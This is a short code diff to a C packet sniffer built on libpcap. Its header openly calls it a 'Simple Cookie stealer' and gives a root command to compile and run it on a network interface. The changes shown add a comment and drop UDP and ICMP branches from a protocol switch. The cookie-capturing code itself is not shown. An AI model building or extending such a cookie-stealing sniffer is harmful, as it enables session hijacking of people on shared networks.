@@ -13,6 +13,8 @@ Simple Cookie Eater v0.1
 -so this is Simple Cookie stealer
 -Just Another Snifer to find cookies
 
+based on tcpdump examples...
+
 *follow my example to run:
   root# gcc -o code code.c -lpcap; ./code eth0 1000 log.txt
 
@@ -177,11 +179,6 @@ TookPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
   case IPPROTO_TCP:
    puts("   Protocol: TCP\n");
    break;
-  case IPPROTO_UDP:
-   puts("   Protocol: UDP\n");
-   return;
-  case IPPROTO_ICMP:
-   puts("   Protocol: ICMP\n");
    return;
   case IPPROTO_IP:
    puts("   Protocol: IP\n");
